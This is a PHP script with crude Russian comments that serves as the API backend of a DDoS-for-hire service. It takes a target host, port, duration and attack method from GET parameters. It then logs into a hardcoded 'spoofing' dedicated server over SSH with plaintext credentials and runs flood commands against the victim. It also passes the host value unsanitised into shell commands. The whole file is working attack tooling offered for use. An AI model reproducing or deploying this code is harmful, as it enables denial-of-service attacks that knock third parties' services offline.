<?php
// http://34533535/api.php?key=pidorpizdatuz&host=[target]&port=[port]&time=[time]&method=[method] <--- вот эта хуимбала типо гет запрос ок да
ignore_user_abort(true);
set_time_limit(86400);
$server_ip = "139.162.251.98";  //IP Дедика со спуфом
$server_pass = "pentruvanzare123";  //пасс дедика со спуфом
$server_user = "ircd";  //рут епта
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$array = array("HTTP-GET","stop"); //Тут все методы твои, stop не удаляй
$ray = array("pidorpizdatuz"); //Тут апи ключ, который сам впишешь и будешь юзать в гет запросе
if (!empty($time)){
if (!empty($host)){
if (!empty($method)){
if ($method == "stop") { $command = "pkill $host -f"; } //Эта хуйня чтоб стопать атаку, команду можешь поменять, если хочешь
}
}	
}
if (!empty($key)){
}else{
die('Ошибка: укажите API-ключ!');}
if (in_array($key, $ray)){
}else{
die('Ошибка: неверный API-ключ!');}
if (!empty($time)){
}else{
die('Ошибка: укажите время атаки!');}
if (!empty($host)){
}else{
die('Ошибка: укажите хост!');}
if (!empty($method)){
}else{
die('Ошибка: укажите метод!');}
if (in_array($method, $array)){
}else{
die('Ошибка: метод, который Вы указали не существует!');}
if ($port > 65535){
die('Ошибка: порта больее 65535 не существует!');}	
if ($time > 86400){
die('Ошибка: атака не может быть более 86400 секунд!');}  
if(ctype_digit($Time)){
die('Ошибка: время указано не в цифрах!');}
if(ctype_digit($Port)){
die('Ошибка: порт указан не в цифрах!');}
//Тут начинаются уже все методы и команда к ним. Можешь сделать свои и удалить мои
if ($method == "attack") { $command = "cd /home/ && ./attack $host $port 2 -1 $time"; }
if ($method == "HTTP-GET") { $command = "./HTTP-GET proxy.txt $host"; }
if (!function_exists("ssh2_connect")) die("Ошибка: SSH2 не установлен на Вашем сервере!");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Ошибка: похоже, дедик ахуел :D";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
	echo "Ошибка: неверный логин или пароль!";
    } else {
	
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
			echo "Атака запущена!</br>Жертва: $host</br>Порт: $port </br>Время: $time</br>Метод: $method";
            fclose($stream);
        }
    }
}
?>